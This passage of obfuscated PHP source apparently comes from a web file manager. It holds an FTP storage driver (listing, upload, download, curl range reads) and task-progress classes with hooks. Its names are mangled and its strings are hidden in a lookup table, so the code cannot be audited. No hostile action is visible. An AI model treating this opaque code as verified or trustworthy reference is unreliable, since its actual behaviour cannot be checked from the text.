($­ä¸ä…´) { return $Ÿª„õ©°; } $Ÿª„õ©°[$ÔèÃ´ºÕ[217]] = $Ÿª„õ©°[$ÔèÃ´ºÕ[87]] = 0; $Ÿª„õ©°[$ÔèÃ´ºÕ[218]] = $Ÿª„õ©°[$ÔèÃ´ºÕ[219]] = !0; $‹ÖÏôÍ© = $this->iconvSystem($ÁÍ¯äé¥); $Ÿª„õ©°[$ÔèÃ´ºÕ[87]] = @ftp_mdtm($this->connect, $‹ÖÏôÍ©); if (empty($íë÷ì)) { $íë÷ì = $this->objectMeta($ÁÍ¯äé¥); if (!$íë÷ì) { return $Ÿª„õ©°; } } $Ÿª„õ©°[$ÔèÃ´ºÕ[78]] = $íë÷ì[$ÔèÃ´ºÕ[78]]; return $Ÿª„õ©°; } public function size($¿êøî§È) { $©‚¦”¿¢ = $this->objectMeta($¿êøî§È); return $©‚¦”¿¢ ? $©‚¦”¿¢[$_SERVER[•Ùç É][78]] : 0; } public function info($Š¦ı—”¸) { if ($this->isFile($Š¦ı—”¸)) { return $this->fileInfo($Š¦ı—”¸, 0); } else { if ($this->isFolder($Š¦ı—”¸)) { return $this->folderInfo($Š¦ı—”¸); } } return !1; } private function fileList($ÜÛø½µ², &$••º¼‰, &$ìÈà‹÷¦, $¬›óİ·Œ = false) { $½©±è®‹ =& $_SERVER[•Ùç É]; $ÜÛø½µ² = $this->iconvSystem($ÜÛø½µ²); if (!$this->isFolder($ÜÛø½µ²)) { return !1; } @ftp_chdir($this->connect, $½©±è®‹[8]); $ÜÛø½µ² = rtrim($ÜÛø½µ², $½©±è®‹[8]) . $½©±è®‹[8]; check_abort(); $üÓ¿Şğ = @ftp_rawlist($this->connect, $ÜÛø½µ²); if (!$üÓ¿Şğ) { $üÓ¿Şğ = array(); } $ÛÈÕ…†’ = array($½©±è®‹[10] => 1, $½©±è®‹[1329] => 1); foreach ($üÓ¿Şğ as $çäœµÎò) { $¿Üâ÷±Ë = $this->_listItem($çäœµÎò); if ($¿Üâ÷±Ë[0] == $½©±è®‹[803]) { continue; } $ü€¡ã¡å = $¿Üâ÷±Ë[8]; if (empty($ü€¡ã¡å) && $ü€¡ã¡å !== $½©±è®‹[214] || isset($ÛÈÕ…†’[$ü€¡ã¡å])) { continue; } $ü€¡ã¡å = $this->iconvApp($ÜÛø½µ² . ltrim($ü€¡ã¡å, $½©±è®‹[8])); $†ÆíÀÕÁ = array($½©±è®‹[32] => $ü€¡ã¡å, $½©±è®‹[33] => $½©±è®‹[216], $½©±è®‹[78] => $¿Üâ÷±Ë[4]); if (substr($çäœµÎò, 0, 1) == $½©±è®‹[1412]) { $†ÆíÀÕÁ[$½©±è®‹[33]] = $½©±è®‹[77]; $†ÆíÀÕÁ[$½©±è®‹[78]] = 0; } $¿ª¥ˆ‰ = $†ÆíÀÕÁ[$½©±è®‹[33]] == $½©±è®‹[77] ? !0 : !1; $this->cacheMethodInfoSet($ü€¡ã¡å, $¿ª¥ˆ‰, $†ÆíÀÕÁ); if ($¿ª¥ˆ‰) { $••º¼‰[] = $ü€¡ã¡å; if ($¬›óİ·Œ) { $this->fileList($ü€¡ã¡å, $••º¼‰, $ìÈà‹÷¦, $¬›óİ·Œ); } continue; } $ìÈà‹÷¦[] = $†ÆíÀÕÁ; } $this->cacheMethodInfoSet($ÜÛø½µ², !0); } private function _listItem($„ÒÃØ) { if (empty($„ÒÃØ)) { return array(); } $™ÕùîÎ = preg_split($_SERVER[•Ùç É][1413], $„ÒÃØ); if (count($™ÕùîÎ) <= 9) { return $™ÕùîÎ; } $™ÕùîÎ[8] = trim(substr($„ÒÃØ, strpos($„ÒÃØ, $™ÕùîÎ[7]) + strlen($™ÕùîÎ[7]))); return array_splice($™ÕùîÎ, 0, 9); } public function listPath($¿Ã“²€–, $¬¯ßÎéş = false) { $â—›Æİ± =& $_SERVER[•Ùç É]; if (!$this->_isconn()) { return !1; } $Ş½ÄÓÚ™ = $¶Ö§ÏıÉ = array(); $this->fileList($¿Ã“²€–, $Ş½ÄÓÚ™, $¶Ö§ÏıÉ); foreach ($Ş½ÄÓÚ™ as $¬ô™Æª° => $£Ï¶›È) { $Ş½ÄÓÚ™[$¬ô™Æª°] = $this->folderInfo($£Ï¶›È, $¬¯ßÎéş); } foreach ($¶Ö§ÏıÉ as $¬ô™Æª° => $£Ï¶›È) { $¶Ö§ÏıÉ[$¬ô™Æª°] = $this->fileInfo($£Ï¶›È[$â—›Æİ±[32]], $¬¯ßÎéş, $£Ï¶›È); } return array($â—›Æİ±[84] => $Ş½ÄÓÚ™, $â—›Æİ±[85] => $¶Ö§ÏıÉ); } public function has($ŒÏáÓ, $”Ü¼ÓÁß = false, $¡‰ù×ƒ = true) { $·ÒŒÙ¥‰ =& $_SERVER[•Ùç É]; $¼×ŠàÊ‹ = $ÌÌÕÕ´ = array(); $ÇˆŸéŸ‰ = $”Ü¼ÓÁß ? !0 : !1; $this->fileList($ŒÏáÓ, $¼×ŠàÊ‹, $ÌÌÕÕ´, $ÇˆŸéŸ‰); if ($”Ü¼ÓÁß) { return array($·ÒŒÙ¥‰[225] => count($ÌÌÕÕ´), $·ÒŒÙ¥‰[226] => count($¼×ŠàÊ‹)); } if ($¡‰ù×ƒ) { if (count($ÌÌÕÕ´)) { return !0; } } else { if (count($¼×ŠàÊ‹)) { return !0; } } return !1; } public function listAll($ÜèÊÈñ) { $ĞÇŠ—¥à =& $_SERVER[•Ùç É]; if (!$this->_isconn()) { return !1; } $†¬¡ Ğ = $‹şŠİ³· = array(); $this->fileList($ÜèÊÈñ, $†¬¡ Ğ, $‹şŠİ³·, !0); $‚‘‡ü¥ = array_to_keyvalue($‹şŠİ³·, $ĞÇŠ—¥à[32]); foreach ($†¬¡ Ğ as $Ş¸¸É·) { if (is_string($Ş¸¸É·)) { $‚‘‡ü¥[$Ş¸¸É·] = array($ĞÇŠ—¥à[78] => 0); } } return $this->listAllFiles($ÜèÊÈñ, $‚‘‡ü¥); } public function getContent($Ã—ßªñ) { if (!$this->_isconn()) { return !1; } $Ã—ßªñ = $this->iconvSystem($Ã—ßªñ); return $this->fileSubstr($Ã—ßªñ); } public function setContent($›‚ëŠµù, $Û„ÃŒ¹ = '') { if (!$this->_isconn()) { return !1; } $¾ş¶èä™ = $this->pathThis($this->iconvSystem($›‚ëŠµù)); $äºÁ¥ = $this->tempFile($¾ş¶èä™); file_put_contents($äºÁ¥, $Û„ÃŒ¹); $ÀÍÖ¢˜ = $this->upload($›‚ëŠµù, $this->iconvApp($äºÁ¥)); $this->tempFileRemve($äºÁ¥); return $ÀÍÖ¢˜; } public function fileSubstr($•ñ³–çÊ, $üîÁŠ’ = 0, $Ì¾úÆÁ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($•ñ³–çÊ, $üîÁŠ’, $Ì¾úÆÁ); } private function ftpRequest($š˜«¹ê¼, $üŒáîƒˆ = 0, $ÕÉ¨œ¬ = false) { $š˜«¹ê¼ = $this->iconvSystem($š˜«¹ê¼); $­¿Ô…ıÛ = $this->scheme . $this->host . $_SERVER[•Ùç É][4] . $this->port; $æ¾ß…€ã = curl_init(); curl_setopt($æ¾ß…€ã, CURLOPT_URL, $­¿Ô…ıÛ . $this->pathEncode($š˜«¹ê¼)); curl_setopt($æ¾ß…€ã, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÕÉ¨œ¬) { $ßÛŞÂÖ¶ = $üŒáîƒˆ + $ÕÉ¨œ¬ - 1; curl_setopt($æ¾ß…€ã, CURLOPT_RANGE, "{$üŒáîƒˆ}\x2d{$ßÛŞÂÖ¶}"); } curl_setopt($æ¾ß…€ã, CURLOPT_RETURNTRANSFER, 1); $Ìœ÷¿Šï = curl_exec($æ¾ß…€ã); curl_close($æ¾ß…€ã); return $Ìœ÷¿Šï; } public function upload($ü¬Š‡ÅÇ, $»†Æ, $á·šîôÓ = false, $¡©‹¾üì = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ü¬Š‡ÅÇ))) { return !1; } $ü¬Š‡ÅÇ = $this->iconvSystem($ü¬Š‡ÅÇ); $»†Æ = $this->iconvSystem($»†Æ); $¥şª­†Æ = ftp_nb_put($this->connect, $ü¬Š‡ÅÇ, $»†Æ, FTP_BINARY); while ($¥şª­†Æ == FTP_MOREDATA) { $¥şª­†Æ = ftp_nb_continue($this->connect); } if ($¥şª­†Æ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ü¬Š‡ÅÇ); } public function download($²¿æöè, $¡âÌ…º‹ = '') { if (!$this->_isconn()) { return !1; } $ùıËÑ‡À = $this->pathFather($¡âÌ…º‹); if (!IO::mkdir($ùıËÑ‡À)) { return !1; } $²¿æöè = $this->iconvSystem($²¿æöè); $¡âÌ…º‹ = $this->iconvSystem($¡âÌ…º‹); $…ƒù´† = ftp_nb_get($this->connect, $¡âÌ…º‹, $²¿æöè, FTP_BINARY); while ($…ƒù´† == FTP_MOREDATA) { $…ƒù´† = ftp_nb_continue($this->connect); } if ($…ƒù´† != FTP_FINISHED) { return !1; } return $this->iconvApp($¡âÌ…º‹); } public function exist($œéİÆÖ) { return $this->isFile($œéİÆÖ) || $this->isFolder($œéİÆÖ); } public function isFile($Ì×“‰¹í) { return !$this->isFolder($Ì×“‰¹í) && $this->objectMeta($Ì×“‰¹í); } public function isFolder($åàé‡ÌÎ) { return $this->cacheMethod($_SERVER[•Ùç É][168], $åàé‡ÌÎ); } protected function objectMeta($ù§·ñŸö) { return $this->cacheMethod($_SERVER[•Ùç É][170], $ù§·ñŸö); } protected function _objectMeta($¼ëâ°­†) { $Î½ƒ³ë² =& $_SERVER[•Ùç É]; if ($¼ëâ°­† == $Î½ƒ³ë²[12] || $¼ëâ°­† == $Î½ƒ³ë²[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¼ëâ°­† = $this->iconvSystem($¼ëâ°­†); $ùÖ­‡ÓÍ = array($Î½ƒ³ë²[32] => $this->iconvApp($¼ëâ°­†), $Î½ƒ³ë²[33] => $Î½ƒ³ë²[216], $Î½ƒ³ë²[78] => 0); @ftp_chdir($this->connect, $Î½ƒ³ë²[8]); $­Î£Ü = @ftp_size($this->connect, $¼ëâ°­†); if ($­Î£Ü != -1) { $ùÖ­‡ÓÍ[$Î½ƒ³ë²[78]] = $­Î£Ü; } else { $¾³àŞÆĞ = @ftp_chdir($this->connect, $¼ëâ°­†); if (!$¾³àŞÆĞ) { return !1; } $ùÖ­‡ÓÍ[$Î½ƒ³ë²[33]] = $Î½ƒ³ë²[77]; } return $ùÖ­‡ÓÍ; } protected function _isFolder($…ï•‹Êß) { $‚Çö›ş =& $_SERVER[•Ùç É]; if ($…ï•‹Êß == $‚Çö›ş[12] || $…ï•‹Êß == $‚Çö›ş[8]) { return !0; } $Ó½ıŸı = $this->_objectMeta($…ï•‹Êß); return isset($Ó½ıŸı[$‚Çö›ş[33]]) && $Ó½ıŸı[$‚Çö›ş[33]] == $‚Çö›ş[77] ? !0 : !1; } } goto E©öº­öáª; Cáï¤ïì²Ï: class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\156\151\x6e\x67"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($§·ù€÷Ş, $ó…´ãèç = '', $’Ï¶´ï = 0, $“ª«µµÆ = '') { $ì—‡¹€² =& $_SERVER[•Ùç É]; if (self::get($§·ù€÷Ş)) { return; } $this->task = array($ì—‡¹€²[445] => $§·ù€÷Ş, $ì—‡¹€²[1705] => USER_ID, $ì—‡¹€²[1593] => $“ª«µµÆ, $ì—‡¹€²[496] => $ì—‡¹€²[12], $ì—‡¹€²[33] => $ó…´ãèç, $ì—‡¹€²[1115] => $ì—‡¹€²[12], $ì—‡¹€²[831] => $’Ï¶´ï, $ì—‡¹€²[1706] => 0, $ì—‡¹€²[1707] => 0, $ì—‡¹€²[1708] => 0, $ì—‡¹€²[1709] => timeFloat(), $ì—‡¹€²[1710] => 0, $ì—‡¹€²[1711] => 0, $ì—‡¹€²[1712] => 0, $ì—‡¹€²[1713] => 0, $ì—‡¹€²[795] => $ì—‡¹€²[1655]); $GLOBALS[$ì—‡¹€²[1714]] = 1; Hook::bind($ì—‡¹€²[1659], array($this, $ì—‡¹€²[1715])); Hook::bind($ì—‡¹€²[1716], array($this, $ì—‡¹€²[1717])); $this->startAfter(); Hook::trigger($ì—‡¹€²[1718], $this->task); $this->task[$ì—‡¹€²[1711]] = timeFloat(); } public function end($à”ïò‰ç = '') { $œ¤Åú• =& $_SERVER[•Ùç É]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$œ¤Åú•[1711]]) { self::valueSet($this->task[$œ¤Åú•[445]], !1); } $this->isEnd = !0; if ($à”ïò‰ç) { $this->task[$œ¤Åú•[496]] = $à”ïò‰ç; } self::log($œ¤Åú•[1719] . $this->task[$œ¤Åú•[445]] . $œ¤Åú•[1720] . sprintf($œ¤Åú•[896], timeFloat() - $this->task[$œ¤Åú•[1709]]) . $œ¤Åú•[1721]); Hook::unbind($œ¤Åú•[1659], array($this, $œ¤Åú•[1715])); Hook::unbind($œ¤Åú•[1716], array($this, $œ¤Åú•[1717])); $this->endAfter(); $õ®äÙúÇ = $this->task; $this->task = !1; Hook::trigger($œ¤Åú•[1722], $õ®äÙúÇ); } public function update($ÔáéœÚ‚ = 0, $Ë¥‹Ë¢Ë = false) { $ûÇâ†‘ =& $_SERVER[•Ùç É]; $ì¶¡Éö =& $this->task; if (!$ì¶¡Éö) { return; } $ì¶¡Éö[$ûÇâ†‘[1706]] += $ÔáéœÚ‚; $ì¶¡Éö[$ûÇâ†‘[1710]] = timeFloat(); if ($ì¶¡Éö[$ûÇâ†‘[831]]) { if ($ì¶¡Éö[$ûÇâ†‘[831]] < $ì¶¡Éö[$ûÇâ†‘[1706]]) { $ì¶¡Éö[$ûÇâ†‘[831]] = $ì¶¡Éö[$ûÇâ†‘[1706]]; } $†¯ºÒ¹Ê = timeFloat() - $ì¶¡Éö[$ûÇâ†‘[1709]] - $ì¶¡Éö[$ûÇâ†‘[1712]]; if ($†¯ºÒ¹Ê <= 0) { $†¯ºÒ¹Ê = 0.001; } $ì¶¡Éö[$ûÇâ†‘[1707]] = $ì¶¡Éö[$ûÇâ†‘[1706]] / $ì¶¡Éö[$ûÇâ†‘[831]]; $ì¶¡Éö[$ûÇâ†‘[1708]] = $ì¶¡Éö[$ûÇâ†‘[1706]] / $†¯ºÒ¹Ê; if ($ì¶¡Éö[$ûÇâ†‘[1707]] > 0) { $ì¶¡Éö[$ûÇâ†‘[1713]] = $†¯ºÒ¹Ê * (1 - $ì¶¡Éö[$ûÇâ†‘[1707]]) / $ì¶¡Éö[$ûÇâ†‘[1707]]; } $ì¶¡Éö[$ûÇâ†‘[1713]] = $ì¶¡Éö[$ûÇâ†‘[1713]] <= 0 ? 0 : $ì¶¡Éö[$ûÇâ†‘[1713]]; } $this->updateAfter(); $í¯§Òùó = 0.2; if (timeFloat() - $ì¶¡Éö[$ûÇâ†‘[1711]] < $í¯§Òùó && !$Ë¥‹Ë¢Ë) { return; } $õïåŸàÁ = self::get($ì¶¡Éö[$ûÇâ†‘[445]]); $ààµÅµ¥ = $õïåŸàÁ[$ûÇâ†‘[795]]; if ($ààµÅµ¥ == self::STATYS_KILL) { $™¯¯Ô›Â = array($ûÇâ†‘[1723] => LNG($ûÇâ†‘[1724]), $ûÇâ†‘[1263] => !1); Cache::set($ûÇâ†‘[1725] . $this->task[$ûÇâ†‘[445]], $™¯¯Ô›Â, 30); $this->onKill(); $this->end(); die; } else { if ($ààµÅµ¥ == self::STATYS_STOP) { $Û¡æıïè = 2; $õïåŸàÁ[$ûÇâ†‘[1712]] += $Û¡æıïè; self::valueSet($ì¶¡Éö[$ûÇâ†‘[445]], $õïåŸàÁ); sleep($Û¡æıïè); $this->update(); return; } } $ì¶¡Éö[$ûÇâ†‘[795]] = $ààµÅµ¥ ? $ààµÅµ¥ : $ì¶¡Éö[$ûÇâ†‘[795]]; $ì¶¡Éö[$ûÇâ†‘[1712]] = $õïåŸàÁ[$ûÇâ†‘[1712]] ? $õïåŸàÁ[$ûÇâ†‘[1712]] : 0; $ì¶¡Éö[$ûÇâ†‘[1711]] = timeFloat(); Hook::trigger($ûÇâ†‘[1726], $ì¶¡Éö); self::valueSet($ì¶¡Éö[$ûÇâ†‘[445]], $ì¶¡Éö); } public function onKillSet($‰†³ªÇ¡, $ƒ‹ùüê  = array()) { $this->onKillCall = array($‰†³ªÇ¡, $ƒ‹ùüê ); } public function onKill() { $èæÙß†ˆ =& $_SERVER[•Ùç É]; self::log($èæÙß†ˆ[1719] . $this->task[$èæÙß†ˆ[445]] . $èæÙß†ˆ[1727]); Hook::trigger($èæÙß†ˆ[1728], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($äÍÉÅÓı) { $“™àš¢ğ =& $_SERVER[•Ùç É]; Cache::set($“™àš¢ğ[1725] . $this->task[$“™àš¢ğ[445]], $äÍÉÅÓı, 60); return $äÍÉÅÓı; } public static function get($©™È—‡) { $Û…éç¶ =& $_SERVER[•Ùç É]; $±¹ÉğÁ = self::valueGet($©™È—‡); if (is_array($±¹ÉğÁ) && $±¹ÉğÁ[$Û…éç¶[1729]]) { $Ú»ƒÑ¡Ù = ActionApply($±¹ÉğÁ[$Û…éç¶[1729]], array($±¹ÉğÁ)); $±¹ÉğÁ = is_array($Ú»ƒÑ¡Ù) ? $Ú»ƒÑ¡Ù : $±¹ÉğÁ; } return $±¹ÉğÁ; } public static function listData() { $ÁŠÚÄÜË = self::valueGet(); return array_sort_by($ÁŠÚÄÜË, $_SERVER[•Ùç É][1709], !0); } public static function kill($°Àƒ˜ñÄ) { return self::changeStatus($°Àƒ˜ñÄ, self::STATYS_KILL); } public static function stop($Ê¿çÅ¤Ö) { return self::changeStatus($Ê¿çÅ¤Ö, self::STATYS_STOP); } public static function restart($„úèæÕì) { return self::changeStatus($„úèæÕì, self::STATYS_RUNNING); } public static function killAll() { $ıŠõÚ‘« =& $_SERVER[•Ùç É]; $Êæ½àã = self::listData(); foreach ($Êæ½àã as $¼­¦ÒÊ¬) { self::kill($¼­¦ÒÊ¬[$ıŠõÚ‘«[445]]); } sleep(2); foreach ($Êæ½àã as $¼­¦ÒÊ¬) { self::valueSet($¼­¦ÒÊ¬[$ıŠõÚ‘«[445]], !1); } } private static function changeStatus($ÎéÖ×ï, $‹í€ã‹ô) { $Ñ ³‚­ğ =& $_SERVER[•Ùç É]; $Ô¥Ô¼¶ = self::valueGet($ÎéÖ×ï); if (!$Ô¥Ô¼¶) { return !1; } $Ô¥Ô¼¶[$Ñ ³‚­ğ[795]] = $‹í€ã‹ô; self::valueSet($ÎéÖ×ï, $Ô¥Ô¼¶); self::log($Ñ ³‚­ğ[1730] . $Ô¥Ô¼¶[$Ñ ³‚­ğ[445]] . $Ñ ³‚­ğ[1731] . $‹í€ã‹ô); return !0; } public static function valueGet($ôØ™Ùâ¬ = false) { $µ‰”»åŒ =& $_SERVER[•Ùç É]; if ($ôØ™Ùâ¬) { $äæœØÜ = Model($µ‰”»åŒ[490])->where(array($µ‰”»åŒ[96] => $ôØ™Ùâ¬, $µ‰”»åŒ[33] => $µ‰”»åŒ[1122]))->find(); return $äæœØÜ ? json_decode($äæœØÜ[$µ‰”»åŒ[420]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($“©¥·×¦ = false) { $”—»©Ó× =& $_SERVER[•Ùç É]; $¹ù–„òş = array($”—»©Ó×[33] => $”—»©Ó×[1122]); if ($“©¥·×¦) { $¹ù–„òş[$”—»©Ó×[1705]] = $“©¥·×¦; } $Ç…ĞØ«¥ = Model($”—»©Ó×[490])->where($¹ù–„òş)->select(); $Ç…ĞØ«¥ = $Ç…ĞØ«¥ ? $Ç…ĞØ«¥ : array(); foreach ($Ç…ĞØ«¥ as $¦Ë‡ä¡ª => $Õšİ°¤ı) { $Ç…ĞØ«¥[$¦Ë‡ä¡ª] = json_decode($Õšİ°¤ı[$”—»©Ó×[420]], !0); } return $Ç…ĞØ«¥; } public static function valueSet($æÚ¿¡², $Øš–Øˆõ) { $Šûô‰şë =& $_SERVER[•Ùç É]; if (!$Øš–Øˆõ) { return Model($Šûô‰şë[490])->where(array($Šûô‰şë[96] => $æÚ¿¡², $Šûô‰şë[33] => $Šûô‰şë[1122]))->delete(); } $à¹ãĞú¯ = json_encode($Øš–Øˆõ); if (!$à¹ãĞú¯) { ob_start(); var_dump($Øš–Øˆõ); $¶¹€°‘« = ob_get_clean(); self::log($Šûô‰şë[1732] . json_encode_force($¶¹€°‘«)); } if (!$æÚ¿¡² || !$Øš–Øˆõ[$Šûô‰şë[445]]) { return !1; } $‡ĞÎ æ = array($Šûô‰şë[33] => $Šûô‰şë[1122], $Šûô‰şë[1705] => USER_ID, $Šûô‰şë[96] => $æÚ¿¡², $Šûô‰şë[420] => $à¹ãĞú¯); $šÃûú€— = $Šûô‰şë[1733]; CacheLock::lock($šÃûú€—); Model($Šûô‰şë[490])->add($‡ĞÎ æ, array(), !0); CacheLock::unlock($šÃûú€—); } public static function log($ÄŸ™¥éÌ) { if (!GLOBAL_DEBUG) { return; } write_log($ÄŸ™¥éÌ, $_SERVER[•Ùç É][1734]); } } class TaskFileTransfer extends Task { protected function startAfter() { $€Âå·Á¼ =& $_SERVER[•Ùç É]; $…½°İ•ş =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($€Âå·Á¼[1735], array($this, $€Âå·Á¼[1736])); Hook::bind($€Âå·Á¼[1274], array($this, $€Âå·Á¼[1737])); Hook::bind($€Âå·Á¼[1738], array($this, $€Âå·Á¼[1739])); Hook::bind($€Âå·Á¼[638], array($this, $€Âå·Á¼[1740])); Hook::bind($€Âå·Á¼[639], array($this, $€Âå·Á¼[1741])); Hook::bind($€Âå·Á¼[645], array($this, $€Âå·Á¼[1742])); Hook::bind($€Âå·Á¼[646], array($this, $€Âå·Á¼[1743])); Hook::bind($€Âå·Á¼[641], array($this, $€Âå·Á¼[1744])); Hook::bind($€Âå·Á¼[643], array($this, $€Âå·Á¼[1745])); Hook::bind($€Âå·Á¼[607], array($this, $€Âå·Á¼[1746])); Hook::bind($€Âå·Á¼[604], array($this, $€Âå·Á¼[1746])); Hook::bind($€Âå·Á¼[609], array($this, $€Âå·Á¼[1746])); Hook::bind($€Âå·Á¼[611], array($this, $€Âå·Á¼[1746])); Hook::bind($€Âå·Á¼[613], array($this, $€Âå·Á¼[1746])); Hook::bind($€Âå·Á¼[1747], array($this, $€Âå·Á¼[1748])); Hook::bind($€Âå·Á¼[629], array($this, $€Âå·Á¼[1749])); $this->sourceModelCopyFlag = !1; Hook::bind($€Âå·Á¼[1750], array($this, $€Âå·Á¼[1751])); Hook::bind($€Âå·Á¼[1752], array($this, $€Âå·Á¼[1753])); Hook::bind($€Âå·Á¼[1754], array($this, $€Âå·Á¼[1755])); $…½°İ•ş[$€Âå·Á¼[1756]] = LNG($€Âå·Á¼[1757]); $…½°İ•ş[$€Âå·Á¼[1758]] = 0; $…½°İ•ş[$€Âå·Á¼[1759]] = 0; $…½°İ•ş[$€Âå·Á¼[1115]] = $€Âå·Á¼[12]; $…½°İ•ş[$€Âå·Á¼[1760]] = $€Âå·Á¼[12]; $…½°İ•ş[$€Âå·Á¼[1761]] = 0; $…½°İ•ş[$€Âå·Á¼[1762]] = 0; $…½°İ•ş[$€Âå·Á¼[1763]] = 0; if (!$…½°İ•ş[$€Âå·Á¼[1593]]) { $…½°İ•ş[$€Âå·Á¼[1593]] = LNG($€Âå·Á¼[1764]); } } protected function endAfter() { $†¤áåñ¢ =& $_SERVER[•Ùç É]; Hook::unbind($†¤áåñ¢[1735], array($this, $†¤áåñ¢[1736])); Hook::unbind($†¤áåñ¢[1274], array($this, $†¤áåñ¢[1737])); Hook::unbind($†¤áåñ¢[1738], array($this, $†¤áåñ¢[1739])); Hook::unbind($†¤áåñ¢[638], array($this, $†¤áåñ¢[1740])); Hook::unbind($†¤áåñ¢[639], array($this, $†¤áåñ¢[1741])); Hook::unbind($†¤áåñ¢[645], array($this, $†¤áåñ¢[1742])); Hook::unbind($†¤áåñ¢[646], array($this, $†¤áåñ¢[1743])); Hook::unbind($†¤áåñ¢[641], array($this, $†¤áåñ¢[1744])); Hook::unbind($†¤áåñ¢[643], array($this, $†¤áåñ¢[1745])); Hook::unbind($†¤áåñ¢[607], array($this, $†¤áåñ¢[1746])); Hook::unbind($†¤áåñ¢[604], array($this, $†¤áåñ¢[1746])); Hook::unbind($†¤áåñ¢[609], array($this, $†¤áåñ¢[1746])); Hook::unbind($†¤áåñ¢[611], array($this, $†¤áåñ¢[1746])); Hook::unbind($†¤áåñ¢[613], array($this, $†¤áåñ¢[1746])); Hook::unbind($†¤áåñ¢[1747], array($this, $†¤áåñ¢[1748])); Hook::unbind($†¤áåñ¢[629], array($this, $†¤áåñ¢[1749])); Hook::unbind($†¤áåñ¢[1750], array($this, $†¤áåñ¢[1751])); Hook::unbind($†¤áåñ¢[1752], array($this, $†¤áåñ¢[1753])); Hook::unbind($†¤áåñ¢[1754], array($this, $†¤áåñ¢[1755])); } public function copyMoveStart($×ëÇïØ, $Öïºí‘, $çƒæ í, $‹øúÃîß) { $üíé¸Íñ =& $_SERVER[•Ùç É]; self::log($üíé¸Íñ[1765] . $Öïºí‘ . $üíé¸Íñ[72] . $‹øúÃîß); $Äû’ğ­‘ = rtrim(TEMP_FILES, $üíé¸Íñ[8]); if (substr($Öïºí‘, 0, strlen($Äû’ğ­‘)) == $Äû’ğ­‘) { return; } if (substr($‹øúÃîß, 0, strlen($Äû’ğ­‘)) == $Äû’ğ­‘) { return; } $õüø÷¦´ =& $this->task; $õüø÷¦´[$üíé¸Íñ[1766]] = KodIO::transferType($×ëÇïØ, $çƒæ í); $this->update(); } public function updateAfter() { $Î§†®åë =& $_SERVER[•Ùç É]; $Ïé´Éå‡ =& $this->task; if (!$Ïé´Éå‡[$Î§†®åë[808]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ïé´Éå‡[$Î§†®åë[1766]] == $Î§†®åë[1366]) { return; } self::updateTask($Ïé´Éå‡); } private static function updateTask(&$øúşÚ¨™) { $í±±Ö­Â =& $_SERVER[•Ùç É]; if ($øúşÚ¨™[$í±±Ö­Â[1766]] == $í±±Ö­Â[1245] || $øúşÚ¨™[$í±±Ö­Â[1766]] == $í±±Ö­Â[109]) { if ($øúşÚ¨™[$í±±Ö­Â[1760]]) { $øúşÚ¨™[$í±±Ö­Â[1763]] = $øúşÚ¨™[$í±±Ö­Â[1762]] + $øúşÚ¨™[$í±±Ö­Â[1759]]; } } else { if ($øúşÚ¨™[$í±±Ö­Â[1766]] == $í±±Ö­Â[1367]) { if ($øúşÚ¨™[$í±±Ö­Â[1760]] == $í±±Ö­Â[1245]) { $øúşÚ¨™[$í±±Ö­Â[1763]] = $øúşÚ¨™[$í±±Ö­Â[1762]] + $øúşÚ¨™[$í±±Ö­Â[1759]] * 0.5; } else { if ($øúşÚ¨™[$í±±Ö­Â[1760]] == $í±±Ö­Â[109]) { $øúşÚ¨™[$í±±Ö­Â[1763]] = $øúşÚ¨™[$í±±Ö­Â[1762]] + $øúşÚ¨™[$í±±Ö­Â[1758]] * 0.5 + $øúşÚ¨™[$í±±Ö­Â[1759]] * 0.5; } } } } $øúşÚ¨™[$í±±Ö­Â[1707]] = $øúşÚ¨™[$í±±Ö­Â[1763]] / $øúşÚ¨™[$í±±Ö­Â[808]]; if ($øúşÚ¨™[$í±±Ö­Â[1707]] > 0) { $¹•Œ”ùí = timeFloat() - $øúşÚ¨™[$í±±Ö­Â[1709]] - $øúşÚ¨™[$í±±Ö­Â[1712]]; $øúşÚ¨™[$í±±Ö­Â[1713]] = $¹•Œ”ùí * (1 - $øúşÚ¨™[$í±±Ö­Â[1707]]) / $øúşÚ¨™[$í±±Ö­Â[1707]]; } } public function addPath($Üö À¦‡) { $„ÅÇûĞ =& $_SERVER[•Ùç É]; if (!$Üö À¦‡) { return; } $ü©ë®ı¡ =& $this->task; $ãˆ¨àƒ = IO::infoWithChildren($Üö À¦‡); $¶ÖÑÛØ = $ü©ë®ı¡[$„ÅÇûĞ[1767]] ? $ü©ë®ı¡[$„ÅÇûĞ[1767]][$„ÅÇûĞ[1768]] : 0; $ü©ë®ı¡[$„ÅÇûĞ[1767]] = array($„ÅÇûĞ[1768] => $¶ÖÑÛØ + 1, $„ÅÇûĞ[464] => $ãˆ¨àƒ[$„ÅÇûĞ[32]], $„ÅÇûĞ[86] => $ãˆ¨àƒ[$„ÅÇûĞ[86]], $„ÅÇûĞ[553] => $ãˆ¨àƒ[$„ÅÇûĞ[553]] ? $ãˆ¨àƒ[$„ÅÇûĞ[553]] : $ãˆ¨àƒ[$„ÅÇûĞ[86]]); if ($ãˆ¨àƒ[$„ÅÇûĞ[33]] == $„ÅÇûĞ[216]) { $ü©ë®ı¡[$„ÅÇûĞ[831]] += 1; } else { $ü©ë®ı¡[$„ÅÇûĞ[831]] += $ãˆ¨àƒ[$„ÅÇûĞ[81]][$„ÅÇûĞ[79]]; if ($ãˆ¨àƒ[$„ÅÇûĞ[183]]) { $ü©ë®ı¡[$„ÅÇûĞ[831]] += $ãˆ¨àƒ[$„ÅÇûĞ[81]][$„ÅÇûĞ[80]] + 1; } } $ü©ë®ı¡[$„ÅÇûĞ[808]] += $ãˆ¨àƒ[$„ÅÇûĞ[78]]; 